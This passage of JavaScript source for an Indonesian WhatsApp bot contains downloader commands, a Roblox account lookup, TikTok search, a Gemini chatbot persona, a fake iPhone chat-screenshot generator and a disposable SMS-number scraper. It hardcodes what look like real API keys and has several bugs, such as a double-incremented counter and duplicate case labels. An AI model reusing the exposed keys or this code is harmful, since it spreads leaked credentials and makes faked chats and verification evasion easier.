 const caption = `╭─── 「 FACEBOOK DOWNLOAD 」\n│\n├─ 🎬 *Judul:* ${title}\n├─ ✨ *Kualitas:* ${videos.hd ? 'HD' : 'SD'}\n├─ 📦 *Ukuran:* ${videoData.size}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { video: { url: videoData.url }, caption: caption }, { quoted: m });
 
 // Twitter / X
 } else if (url.includes("twitter.com") || url.includes("x.com")) {
 await m.reply("⏳ Mengambil media dari Twitter/X...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/twitter?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 const result = apiResponse.result;
 if (!apiResponse.status || !result?.media) throw new Error("API Twitter Zenz tidak memberikan hasil yang valid.");
 const { title: tweetText = 'Tanpa Teks', author } = result.tweet;
 const allMedia = [...result.media.photos, ...result.media.videos];
 if (allMedia.length === 0) throw new Error("Tidak ada media di tweet ini.");
 const caption = `╭─── 「 TWITTER DOWNLOAD 」\n│\n├─ 💬 *Tweet:* ${tweetText}\n├─ 👤 *Author:* @${author || 'N/A'}\n│\n╰─── 「 ${botName} 」`;
 let isFirst = true;
 for (const media of allMedia) {
 await Sky.sendMessage(m.chat, { [media.type.startsWith('video') ? 'video' : 'image']: { url: media.url }, caption: isFirst ? caption : '' }, { quoted: m });
 isFirst = false;
 }
 
 // Pinterest
 } else if (url.includes("pinterest.com")) {
 await m.reply("⏳ Mengambil media Pinterest...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/pinterest?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 const results = apiResponse.result;
 if (!apiResponse.status || !Array.isArray(results) || results.length === 0) throw new Error("API Pinterest Zenz tidak memberikan hasil yang valid.");
 const bestResult = results[0];
 const mediaType = bestResult.tag === 'video' ? 'video' : 'image';
 const caption = `╭─── 「 PINTEREST DOWNLOAD 」\n│\n├─ ✨ *Kualitas:* ${bestResult.quality || 'Terbaik'}\n├─ 🎞️ *Tipe:* ${mediaType.toUpperCase()}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { [mediaType]: { url: bestResult.direct }, caption: caption }, { quoted: m });
 
 // SoundCloud
 } else if (url.includes("soundcloud.com")) {
 await m.reply("⏳ Mengambil audio SoundCloud...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/soundcloud?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 if (!apiResponse.status || !apiResponse.audio_url) throw new Error("API SoundCloud Zenz tidak memberikan hasil yang valid.");
 const { title = 'SoundCloud Audio', author = 'N/A', duration = 'N/A', thumbnail, audio_url } = apiResponse;
 const caption = `╭─── 「 SOUNDCLOUD DOWNLOAD 」\n│\n├─ 🎵 *Judul:* ${title}\n├─ 👤 *Artis:* ${author}\n├─ ⏱️ *Durasi:* ${duration}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { image: { url: thumbnail }, caption: caption }, { quoted: m });
 await Sky.sendMessage(m.chat, { audio: { url: audio_url }, mimetype: 'audio/mpeg', fileName: `${title}.mp3` }, { quoted: m });

 // MediaFire
 } else if (url.includes("mediafire.com")) {
 await m.reply("⏳ Mengambil file dari MediaFire...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/mediafire?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 const result = apiResponse.result;
 if (!apiResponse.status || !result?.download) throw new Error("API MediaFire Zenz tidak memberikan hasil yang valid.");
 const { filename, size, created, mimetype, download: link } = result;
 const uploadDate = new Date(created || Date.now()).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 const caption = `╭─── 「 MEDIAFIRE DOWNLOAD 」\n│\n├─ 📂 *Nama:* ${filename || 'file'}\n├─ 📦 *Ukuran:* ${size || 'N/A'}\n├─ 📅 *Diunggah:* ${uploadDate}\n├─ 📑 *Tipe:* ${mimetype || 'application/octet-stream'}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { document: { url: link }, mimetype: mimetype, fileName: filename, caption: caption }, { quoted: m });
 
 // Terabox
 } else if (url.includes("terabox.com")) {
 await m.reply("⏳ Mengambil file dari Terabox...");
 const apiUrl = `https://zenzxz.dpdns.org/downloader/terabox?url=${encodeURIComponent(url)}`;
 const { data: apiResponse } = await axios.get(apiUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
 const result = apiResponse.result;
 if (!apiResponse.status || !result?.direct_url) throw new Error("API Terabox Zenz tidak memberikan hasil yang valid.");
 const { filename = 'terabox_video.mp4', size, thumb, direct_url: link } = result;
 const sizeInMB = size ? (parseInt(size) / (1024 * 1024)).toFixed(2) + ' MB' : 'N/A';
 const caption = `╭─── 「 TERABOX DOWNLOAD 」\n│\n├─ 📂 *Judul:* ${filename}\n├─ 📦 *Ukuran:* ${sizeInMB}\n│\n╰─── 「 ${botName} 」`;
 await Sky.sendMessage(m.chat, { image: { url: thumb }, caption: caption }, { quoted: m });
 await Sky.sendMessage(m.chat, { video: { url: link }, mimetype: 'video/mp4', fileName: filename }, { quoted: m });
 
 } else {
 // Fallback untuk link lain
 await m.reply("⏳ Link tidak dikenali, mencoba mengunduh sebagai file generik...");
 const { data: fileBuffer, headers } = await axios.get(url, { responseType: 'arraybuffer', headers: { 'User-Agent': 'Mozilla/5.0' } });
 const mimeType = headers['content-type'] || 'application/octet-stream';
 const fileName = path.basename(new URL(url).pathname) || `downloaded_file`;
 const caption = `╭─── 「 FILE DOWNLOAD 」\n│\n├─ 📂 *Nama File:* ${fileName}\n├─ 📑 *Tipe:* ${mimeType}\n│\n╰─── 「 Direct Download 」`;
 await Sky.sendMessage(m.chat, { document: fileBuffer, mimetype: mimeType, fileName: fileName, caption: caption }, { quoted: m });
 }
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
 } catch (error) {
 console.error("Error pada command DL:", error);
 m.reply(`❌ Gagal memproses permintaan.\n\n*Alasan:* ${error.message}`);
 await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
 }
}
break;
 
//=======================================================

case 'roblox': case 'roblox-stalk': {
 if (!text) return m.reply('Masukkan username Roblox!\nContoh: .roblox Only_BFbloxfruits');
 await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}})
 const username = encodeURIComponent(text.trim());
 const apiKey = 'DitssGanteng';
 const url = `https://api.ditss.cloud/stalk/roblox?username=${username}&apikey=${apiKey}`;
 try {
 let res = await fetch(url);
 let data = await res.json();
 if (!data.status || !data.result) return m.reply('Akun tidak ditemukan atau terjadi kesalahan.');
 const r = data.result;
 let teks = `*R O B L O X S T A L K*\n\n`;
 teks += `*Display Name:* ${r.displayName}\n`;
 teks += `*Username:* ${r.username}\n`;
 teks += `*User ID:* ${r.userId}\n`;
 teks += `*Bio:* ${r.bio || '-'}\n`;
 teks += `*Tanggal Dibuat:* ${new Date(r.createdAt).toLocaleString('id-ID')}\n`;
 teks += `*Banned:* ${r.isBanned ? 'Ya' : 'Tidak'}\n`;
 teks += `*Friends:* ${r.friendsCount}\n`;
 teks += `*Followers:* ${r.followersCount}\n`;
 teks += `*Following:* ${r.followingCount}\n`;
 if (r.groups.length > 0) {
 teks += `\n*Group Joined:* (${r.groups.length} grup)\n`;
 r.groups.slice(0, 5).forEach((g, i) => {
 teks += `${i+1}. ${g.group.name} [${g.role.name}] - ${g.group.memberCount} member\n`;
 });
 }
 let imageUrl = r.avatar; 
 let caption = teks; 
 await Sky.sendMessage(m.chat, {
  image: { url: imageUrl },
  caption: caption
}, { quoted: m });
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
 } catch (err) {
 console.error(err);
 m.reply('Gagal mengambil data. Coba lagi nanti.');
 await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
 }
}
break;

//=======================================================
    
 /*
 CASE TIKTOKSEARCH Cv By Rim Offc
tq to siputzx api
sumber: https://whatsapp.com/channel/0029Vap84RE8KMqfYnd0V41A

grub belajar bot: https://chat.whatsapp.com/GdDaVo9FYin4KStIo6Psno

jan bully bg, bru balik 
*/

case 'searchtiktok2':
case 'stiktok2':
case 'stt2': {
  if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *query*\n\n_Contoh_\n\n${prefix + command} jj epep`)
  await Sky.sendMessage(m.chat, { react: { text: "🕒", key: m.key } })

  try {
    let res = await fetch(`https://api.siputzx.my.id/api/s/tiktok?query=${encodeURIComponent(text)}`)
    let json = await res.json()
    if (!json.status || !json.data || json.data.length === 0) return m.reply('Video tidak ditemukan.')

    let teks = '*📥 TikTok Search Result*\n\n'
    teks += 'Ketik *.tt* <linknya> untuk mengambil video/photo.\n'
    for (let i of json.data) { 
      teks += `*Judul*    : ${i.title}\n`
      teks += `*Video ID* : ${i.video_id}\n`
      teks += `*User*     : ${i.author.unique_id}\n`
      teks += `*Nickname* : ${i.author.nickname}\n`
      teks += `*Durasi*   : ${i.duration} detik\n`
      teks += `*Likes*    : ${i.digg_count}\n`
      teks += `*Comments* : ${i.comment_count}\n`
      teks += `*Shares*   : ${i.share_count}\n`
      teks += `*Link*     : https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`
      teks += `──────────────────────\n`
      }
      m.reply(teks)
await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}})
  } catch (error) {
     await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}})
    console.log(error)
    m.reply(`Gagal mengambil hasil pencarian TikTok.\n\nTerjadi kesalahan atau hasil kosong.`)
  }
}
break
    
//=======================================================
    /*
 CASE TIKTOKSEARCH Cv By Rim Offc
tq to siputzx api
sumber: https://whatsapp.com/channel/0029Vap84RE8KMqfYnd0V41A

grub belajar bot: https://chat.whatsapp.com/GdDaVo9FYin4KStIo6Psno

jan bully bg, bru balik 
*/

case 'searchtiktok2':
case 'stiktok2':
case 'stt2but': {
  if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *query*\n\n_Contoh_\n\n${prefix + command} jj epep`);
  await Sky.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });

  try {
    let res = await fetch(`https://api.siputzx.my.id/api/s/tiktok?query=${encodeURIComponent(text)}`);
    let json = await res.json();
    if (!json.status || !json.data || json.data.length === 0) return m.reply('Video tidak ditemukan.');

    let teks = '*📥 TikTok Search Result*\n\n';
    teks += 'Ketik *.tt* untuk mengambil video/photo.\n';
    let no = 1; // Inisialisasi counter urutan

    let allbuttons = [];
    for (let i of json.data) {
      const link = `https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}`;
      
      teks += `*Urutan* : ${no++}\n`; // Gunakan nilai 'no' saat ini untuk tampilan
      teks += `*Judul* : ${i.title}\n`;
      teks += `*Video ID* : ${i.video_id}\n`;
      teks += `*User* : ${i.author.unique_id}\n`;
      teks += `*Nickname* : ${i.author.nickname}\n`;
      teks += `*Durasi* : ${i.duration} detik\n`;
      teks += `*Likes* : ${i.digg_count}\n`;
      teks += `*Comments* : ${i.comment_count}\n`;
      teks += `*Shares* : ${i.share_count}\n`;
      teks += `*Link* : ${link}\n`; // Menggunakan variabel 'link' yang sudah didefinisikan
      teks += `──────────────────────\n`;
       
      allbuttons.push({
        name: "cta_copy", // Asumsi 'cta_copy' didukung oleh implementasi Sky.sendMessage Anda
        buttonParamsJson: JSON.stringify({
             display_text: `Salin Link Urutan ${no}`, // Teks yang lebih jelas untuk tombol
             id: link, // 'id' bisa berupa link itu sendiri
             copy_code: link
            })
      });
      no++; // Tingkatkan 'no' sekali setelah semua penggunaan di iterasi ini
    }

    const buttonMessage = {
        text: teks,
        footer: "Klik Tombol Dibawah Untuk Menyalin Tautan",
        buttons: allbuttons
    };
   
    await Sky.sendMessage(m.chat, buttonMessage, { quoted: m });
    await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}});
  } catch (error) {
     await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}});
    console.log(error); // Log error ke console untuk debugging
    m.reply(`Gagal mengambil hasil pencarian TikTok.\n\nTerjadi kesalahan atau hasil kosong.`);
  }
}
break; // Tambahkan titik koma di akhir blok case

//=======================================================
case 'wahyu':
case 'wahyuai': {
const fs = require("fs")
const path = require("path")
const fetch = require("node-fetch")
const unzipper = require("unzipper")
const { GoogleGenerativeAI } = require("@google/generative-ai")

const TEMP = "./library/database/sampah"
if (!fs.existsSync(TEMP)) fs.mkdirSync(TEMP, { recursive: true })

const API_KEY = "AIzaSyBg_Q_QhTDsZ2ddbVyffVSMeF8mhk7ivpI"
const ai = new GoogleGenerativeAI(API_KEY)

const OWNER = `${global.owner}`
const SD_KEY = process.env.SD_KEY || ""

const sender = m.sender.replace(/[^0-9]/g, "")
const isGroup = m.isGroup
const groupId = isGroup ? m.chat : null
const userName = m.pushName || "User"
const userText = args.length ? args.join(" ") : "Perkenalkan diri anda"

await Sky.sendMessage(m.chat, { react: { text: "🕒", key: m.key } })

async function getWorkingModel(ai) {
    const candidates = [
        "gemini-3-pro-preview",
        "gemini-2.5-pro",
        "gemini-2.5-flash",
        "gemini-2.5-flash-lite",
        "gemini-2.0-flash",
        "gemini-2.0-flash-lite"
    ]
    for (let m of candidates) {
        try {
            const testModel = ai.getGenerativeModel({ model: m })
            await testModel.generateContent("test")
            return m
        } catch {}
    }
    throw new Error("Tidak ada model yang tersedia.")
}

const ROOT = "./gemini_sessions"
const DIR = isGroup ? path.join(ROOT, "group", groupId) : path.join(ROOT, "private", sender)
if (!fs.existsSync(DIR)) fs.mkdirSync(DIR, { recursive: true })

const sessionFile = path.join(DIR, "session.json")
const timeFile = path.join(DIR, "timestamp.json")

if (!fs.existsSync(sessionFile)) fs.writeFileSync(sessionFile, JSON.stringify([]))
if (!fs.existsSync(timeFile)) fs.writeFileSync(timeFile, JSON.stringify(Date.now()))

function loadSession() {
    return JSON.parse(fs.readFileSync(sessionFile))
}
function saveSession(d) {
    fs.writeFileSync(sessionFile, JSON.stringify(d, null, 2))
    fs.writeFileSync(timeFile, JSON.stringify(Date.now()))
}
function deleteSession(dir) {
    let a = path.join(dir, "session.json")
    let b = path.join(dir, "timestamp.json")
    if (fs.existsSync(a)) fs.unlinkSync(a)
    if (fs.existsSync(b)) fs.unlinkSync(b)
}

let lastTime = Number(JSON.parse(fs.readFileSync(timeFile)))
let expired = Date.now() - lastTime >= 7 * 24 * 60 * 60 * 1000
if (expired) {
    deleteSession(DIR)
    fs.writeFileSync(sessionFile, JSON.stringify([]))
    fs.writeFileSync(timeFile, JSON.stringify(Date.now()))
}

let aiOverride = null
if (userText.toLowerCase() === "hapus session") {
    deleteSession(DIR)
    aiOverride = `Session user ${sender} (${userName}) sudah dihapus.`
}

if (userText.startsWith("hapus session ") && m.sender === OWNER + "@s.whatsapp.net") {
    const target = userText.split(" ")[2]
    if (target) {
        deleteSession(path.join(ROOT, "private", target))
        deleteSession(path.join(ROOT, "group", target))
        aiOverride = `Owner menghapus session user ${target}.`
    }
}

let history = loadSession()

async function realtimeInfo() {
    const t = new Date()
    return {
        wib: t.toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
        wita: t.toLocaleString("id-ID", { timeZone: "Asia/Makassar" }),
        wit: t.toLocaleString("id-ID", { timeZone: "Asia/Jayapura" })
    }
}

async function getNews(topic) {
    try {
        let r = await fetch(`https://newsapi.org/v2/top-headlines?country=id&q=${encodeURIComponent(topic)}&apiKey=8f2dd5b5c9bc4df8be6ca879c98c7f31`)
        let d = await r.json()
        if (!d.articles) return { list: "", disaster: null }
        let arts = d.articles.slice(0, 5)
        let list = arts.map(a => `• ${a.title}`).join("\n")
        let disaster = null
        let keys = ["gempa","banjir","longsor","tsunami","kebakaran","gunung"]
        for (let a of arts) {
            let t = a.title.toLowerCase()
            for (let k of keys) if (t.includes(k)) disaster = "Indonesia"
        }
        return { list, disaster }
    } catch { return { list: "", disaster: null } }
}

const askRealtime = /waktu|jam|hari|tanggal|wib|wita|wit/i.test(userText)
const askNews = /berita|politik|gempa|tsunami|banjir|bencana/i.test(userText)

const realtime = askRealtime ? await realtimeInfo() : null
const news = askNews ? await getNews(userText) : { list: "", disaster: null }
const footer = news.disaster ? `\n\nPray for Indonesia 🙏` : ""

async function readAnyFile(buffer, mime) {
    if (!mime) return { type: "unknown", data: buffer.toString("base64") }
    if (mime.startsWith("image/")) return { type: "image", mime, data: buffer.toString("base64") }
    if (mime.startsWith("audio/")) return { type: "audio", mime, data: buffer.toString("base64") }
    if (mime.startsWith("video/")) return { type: "video", mime }
    if (mime.includes("zip")) {
        let zipPath = path.join(TEMP, `tmp_${Date.now()}.zip`)
        fs.writeFileSync(zipPath, buffer)
        let files = []
        await fs.createReadStream(zipPath).pipe(unzipper.Parse()).on("entry", e => files.push(e.path))
        fs.unlinkSync(zipPath)
        return { type: "zip", files }
    }
    return { type: "doc", mime, text: buffer.toString() }
}

async function SD_generate(prompt) {
    if (!SD_KEY) return null
    try {
        let r = await fetch("https://api.fal.ai/text-to-image", {
            method: "POST",
            headers: { "Content-Type": "application/json", "Authorization": `Key ${SD_KEY}` },
            body: JSON.stringify({ prompt })
        })
        let d = await r.json()
        return d.image ? d.image.url : null
    } catch { return null }
}

async function SD_edit(base64img, prompt) {
    if (!SD_KEY) return null
    try {
        let r = await fetch("https://api.fal.ai/image-to-image", {
            method: "POST",
            headers: { "Content-Type": "application/json", "Authorization": `Key ${SD_KEY}` },
            body: JSON.stringify({ prompt, image: base64img })
        })
        let d = await r.json()
        return d.image ? d.image.url : null
    } catch { return null }
}

async function lexicaGenerate(prompt) {
    try {
        let r = await fetch(`https://lexica.art/api/v1/search?q=${encodeURIComponent(prompt)}`)
        let d = await r.json()
        return d.images?.[0]?.src || null
    } catch { return null }
}

const qmsg = m.quoted ? m.quoted : m
const mime = (qmsg.msg || qmsg)?.mimetype || ""

let hasMedia = /image|audio|video|pdf|msword|officedocument|zip|text|json/.test(mime)
let mediaBase64 = ""
let mediaMime = mime

if (hasMedia) {
    let p = await Sky.downloadAndSaveMediaMessage(qmsg)
    mediaBase64 = fs.readFileSync(p).toString("base64")
    fs.unlinkSync(p)
}

const askImageGen = /buat gambar|generate gambar|bikin gambar|gambar dong|gambar ini/i.test(userText.toLowerCase())
const askEditImg = /edit/i.test(userText.toLowerCase()) && mime.startsWith("image")

let imageResult = null
if (askImageGen) {
    let sd = await SD_generate(userText)
    imageResult = sd || await lexicaGenerate(userText)
}
if (askEditImg) {
    let p = await Sky.downloadAndSaveMediaMessage(qmsg)
    let b64 = fs.readFileSync(p).toString("base64")
    let sd = await SD_edit(b64, userText)
    imageResult = sd || await lexicaGenerate(userText)
    fs.unlinkSync(p)
}

const selectedModel = await getWorkingModel(ai)
const model = ai.getGenerativeModel({ model: selectedModel })

const chat = model.startChat({
    history: history.map(h => ({ text: h.text }))
})

let systemPrompt =
`Nama anda Wahyu, AI gaul santai, pintar, dan akurat.
Jika ditanya "siapa kamu", jawab bahwa kamu adalah Wahyu AI, Gemini yang disempurnakan oleh Rafz.

Kemampuan utama:
- Baca gambar, audio, video, dokumen, teks
- Edit & generate gambar
- Jelaskan isi media
- Analisis data, coding, hitungan
- Ringkasan berita & waktu real-time

Cara penggunaan:
.wahyu halo
.wahyuai apa itu AI
Reply foto → .wahyu jelasin
Reply audio → .wahyu dengerin
Reply dokumen → .wahyu bacain
.wahyu buat gambar naga terbang
.wahyu edit jadi 4K

${aiOverride ? aiOverride : ""}
${askRealtime ? `Waktu Indonesia: WIB ${realtime.wib}` : ""}
${askNews ? `Berita terbaru:\n${news.list}` : ""}`

let parts = [
    { text: systemPrompt + "\n\nPertanyaan: " + userText }
]

if (hasMedia) {
    parts.push({
        inlineData: {
            mimeType: mediaMime,
            data: mediaBase64
        }
    })
}

let aiRes = await chat.sendMessage(parts)
let reply = aiRes.response.text() + footer

if (imageResult) {
    await Sky.sendMessage(m.chat, { image: { url: imageResult }, caption: reply })
} else {
    await m.reply(reply)
}

history.push({ text: userText }, { text: reply })
saveSession(history)

await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
break
}
 //=======================================================

case 'ciqc': {
  let splitText = text.split("|").map(t => t.trim());

  if (splitText.length < 5) {
    return Reply(`Format salah!\nGunakan: ${prefix+command} pesan|18:00|Provider|100|4`);
  }

  const pesan = splitText[0];
  const jam = splitText[1];
  let provider = splitText[2];
  const baterai = parseInt(splitText[3]);
  const signal = parseInt(splitText[4]);

  // ✅ Validasi pesan
  if (!pesan) {
    return Reply(`Pesan tidak boleh kosong!\nContoh: ${prefix+command} hai|18:00|Telkomsel|50|3`);
  }

  // ✅ Validasi jam (format HH:MM)
  if (!/^\d{2}:\d{2}$/.test(jam)) {
    return Reply(`Format jam salah!\nContoh: ${prefix+command} hai|18:00|Telkomsel|50|3`);
  }

  // ✅ Validasi baterai
  if (isNaN(baterai) || baterai < 1 || baterai > 100) {
    return Reply(`Baterai harus 1 - 100%\nContoh: ${prefix+command} hai|18:00|Telkomsel|50|3`);
  }

  // ✅ Validasi sinyal
  if (isNaN(signal) || signal < 1 || signal > 4) {
    return Reply(`Sinyal harus 1 - 4 bar\nContoh: ${prefix+command} hai|18:00|Telkomsel|50|3`);
  }

  // ✅ Format provider (max 12 huruf → potong dan kasih "…")
  provider = provider.toUpperCase();
  if (provider.length > 12) {
    provider = provider.slice(0, 12) + "…";
  }

  const res = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(jam)}&messageText=${encodeURIComponent(pesan)}&carrierName=${encodeURIComponent(provider)}&batteryPercentage=${baterai}&signalStrength=${signal}`;

  await Sky.sendMessage(m.chat, { image: { url: res } });
}
break;
//=======================================================
// =====================
// CASE: nokos / tempnumber  (final siap paste)
// =====================
case "nokos":
case "tempnumber": {
  const fs = require("fs");
  const axios = require("axios");
  const cheerio = require("cheerio");
  const path = require("path");

  // hanya privat
  if (m.isGroup) return Reply(mess.private);

  // path absolut di container
  const dirPath = path.join(process.cwd(), "library/database/sampah");
  const filePath = path.join(dirPath, "sessions.json");
  if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
  if (!fs.existsSync(filePath)) fs.writeFileSync(filePath, JSON.stringify({}));

  const load = () => {
    try {
      return JSON.parse(fs.readFileSync(filePath, "utf8") || "{}");
    } catch {
      return {};
    }
  };
  const save = (data) => fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

  let sessions = load();
  const user = m.sender;
  global.tempSessions = global.tempSessions || {};

  const formatTime = sec => {
    const m_ = String(Math.floor(sec / 60)).padStart(2, "0");
    const s_ = String(sec % 60).padStart(2, "0");
    return `${m_}:${s_}`;
  };

  const defaultHeaders = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  };

  // ===== Luban (API tanpa key) =====
  const getNumberLuban = async (country) => {
    const res = await axios.get(`https://lubansms.com/v2/api/freeNumbers?countries=${country}`, { headers: defaultHeaders, timeout: 15000 });
    if (!res.data || res.data.code !== 0) throw new Error("luban: invalid country");
    const aktif = Array.isArray(res.data.msg) ? res.data.msg.filter(n => !n.is_archive) : [];
    if (!aktif.length) throw new Error("luban: no active number");
    const x = aktif[0];
    return { provider: "luban", number: x.number, full: x.full_number, age: x.data_humans || "-" , messages: [] };
  };

  const getMessagesLuban = async (country, number) => {
    try {
      const res = await axios.get(`https://lubansms.com/v2/api/freeMessage?countries=${country}&number=${number}`, { headers: defaultHeaders, timeout: 15000 });
      if (!res.data || res.data.code !== 0) return [];
      return Array.isArray(res.data.msg) ? res.data.msg.map(x => ({ from: x.in_number || "Unknown", text: x.text || "(kosong)", time: x.created_at })) : [];
    } catch {
      return [];
    }
  };

  // ===== Scraper: receive-smss.com (contoh) =====
  const scrapeReceiveSmss = async (country) => {
    try {
      const url = `https://receive-smss.com/country/${encodeURIComponent(country)}`;
      const res = await axios.get(url, { headers: defaultHeaders, timeout: 15000 });
      const $ = cheerio.load(res.data);
      // coba temukan link angka/halaman nomor
      const linkEls = $("a[href]").filter((i, el) => {
        const h = $(el).attr("href") || "";
        return /number|phone|sms/i.test(h) || $(el).hasClass("number");
      }).toArray();

      for (const el of linkEls) {
        try {
          const href = $(el).attr("href");
          if (!href) continue;
          await new Promise(r => setTimeout(r, 250));
          const absolute = new URL(href, url).href;
          const detail = await axios.get(absolute, { headers: defaultHeaders, timeout: 15000 });
          const $$ = cheerio.load(detail.data);
          const num = $$("h1, .phone, .number").first().text().trim().replace(/\D/g, "");
          const msgs = [];
          $$(".inbox .msg, .message, .sms-list li, .smses .sms").each((i, item) => {
            const from = $$(item).find(".from, .source").text().trim() || "Unknown";
            const text = $$(item).find(".text, .message-text").text().trim() || $$(item).text().trim();
            const time = $$(item).find(".time, .date").text().trim() || new Date().toISOString();
            if (text) msgs.push({ from, text, time });
          });
          if (num) return { provider: "receive-smss", number: num, full: num, age: "?", messages: msgs };
        } catch (e) {
          continue;
        }
      }
      throw new Error("receive-smss: no number/sms");
    } catch (e) {
      throw new Error("receive-smss: " + e.message);
    }
  };

  // ===== Scraper: sms24.me =====
  const scrapeSms24 = async (country) => {
    try {
      const url = `https://sms24.me/${encodeURIComponent(country)}`;
      const res = await axios.get(url, { headers: defaultHeaders, timeout: 15000 });
      const $ = cheerio.load(res.data);
      const nodes = $("a[href*='/number/'], a[href*='number']").toArray();
      for (const n of nodes) {
        try {
          const href = $(n).attr("href");
          if (!href) continue;
          await new Promise(r => setTimeout(r, 250));
          const detail = await axios.get(new URL(href, url).href, { headers: defaultHeaders, timeout: 15000 });
          const $$ = cheerio.load(detail.data);
          const num = $$("h1, .phone, .number").first().text().trim().replace(/\D/g, "");
          const msgs = [];
          $$(".smses .sms, .inbox .sms, .message-item, .sms-list li").each((i, el) => {
            const from = $$(el).find(".source, .from").text().trim() || "Unknown";
            const text = $$(el).find(".text, .sms-text").text().trim() || $$(el).text().trim();
            const time = $$(el).find(".date, .time").text().trim() || new Date().toISOString();
            if (text) msgs.push({ from, text, time });
          });
          if (num) return { provider: "sms24", number: num, full: num, age: "?", messages: msgs };
        } catch (e) {
          continue;
        }
      }
      throw new Error("sms24: no number/sms");
    } catch (e) {
      throw new Error("sms24: " + e.message);
    }
  };

  // ===== Scraper: receivefreesms.com =====
  const scrapeReceiveFreeSms = async (country) => {
    try {
      const url = `https://receivefreesms.com/country/${encodeURIComponent(country)}`;
      const res = await axios.get(url, { headers: defaultHeaders, timeout: 15000 });
      const $ = cheerio.load(res.data);
      const entries = $("a[href*='number'], a[href*='/number/']").toArray();
      for (const el of entries) {
        try {
          const href = $(el).attr("href");
          if (!href) continue;
          await new Promise(r => setTimeout(r, 250));
          const detail = await axios.get(new URL(href, url).href, { headers: defaultHeaders, timeout: 15000 });
          const $$ = cheerio.load(detail.data);
          const num = $$("h1, .num, .phone").first().text().trim().replace(/\D/g, "");
          const msgs = [];
          $$(".sms-list li, .messages .msg, .sms-item").each((i, it) => {
            const from = $$(it).find(".from, .source").text().trim() || "Unknown";
            const text = $$(it).find(".text, .sms-text").text().trim() || $$(it).text().trim();
            const time = $$(it).find(".time, .date").text().trim() || new Date().toISOString();
            if (text) msgs.push({ from, text, time });
          });
          if (num) return { provider: "receivefreesms", number: num, full: num, age: "?", messages: msgs };
        } catch (e) {
          continue;
        }
      }
      throw new Error("receivefreesms: no number/sms");
    } catch (e) {
      throw new Error("receivefreesms: " + e.message);
    }
  };

  // ===== Generic fallback (luban -> scrapers) =====
  const getNumberFallback = async (country) => {
    // try luban first
    try {
      const lub = await getNumberLuban(country);
      lub.provider = "luban";
      return lub;
    } catch (e) {
      // continue to scrapers
    }
    const scrapers = [scrapeReceiveSmss, scrapeSms24, scrapeReceiveFreeSms];
    for (const fn of scrapers) {
      try {
        const r = await fn(country);
        if (r && r.number) return r;
      } catch (e) {
        continue;
      }
    }
    throw new Error("all-failed: no provider returned number");
  };

  // ===== Generic getMessages for stored session =====
  const getMessagesGeneric = async (session) => {
    if (!session.provider) return [];
    if (session.provider === "luban") return await getMessagesLuban(session.country, session.number);
    try {
      if (session.provider === "receive-smss") return (await scrapeReceiveSmss(session.country)).messages || [];
      if (session.provider === "sms24") return (await scrapeSms24(session.country)).messages || [];
      if (session.provider === "receivefreesms") return (await scrapeReceiveFreeSms(session.country)).messages || [];
    } catch {
      return [];
    }
    return [];
  };

  // Jika tanpa argumen → tampilkan daftar negara Luban
  if (!text) {
    await Sky.sendMessage(m.chat, { react: { text: "🌍", key: m.key } });
    try {
      const { data } = await axios.get("https://lubansms.com/v2/api/freeCountries", { headers: defaultHeaders, timeout: 15000 });
      const list = [];
      for (const [i, c] of (data.msg || []).filter(c => c.online).entries()) {
        try {
          const num = await getNumberLuban(c.name.toLowerCase());
          list.push(`🌍 ${i + 1}. *${c.name}*\n📞 Nomor aktif: 1\n⏳ Umur nomor: ${num.age}`);
        } catch {
          list.push(`🌍 ${i + 1}. *${c.name}*\n📞 Nomor aktif: 0\n⏳ Umur nomor: ?`);
        }
      }
      return m.reply(`🌎 *Daftar Negara (sumber: Luban)*:\n\n${list.join("\n\n")}\n\n📌 Contoh: .nokos russia`);
    } catch (e) {
      return m.reply("❌ Gagal ambil daftar negara dari Luban.");
    }
  }

  // Hapus sesi lama user ini (jika ada)
  if (global.tempSessions[user]) {
    clearInterval(global.tempSessions[user].interval);
    delete global.tempSessions[user];
  }

  // Ambil nomor (fallback luban -> scrapers)
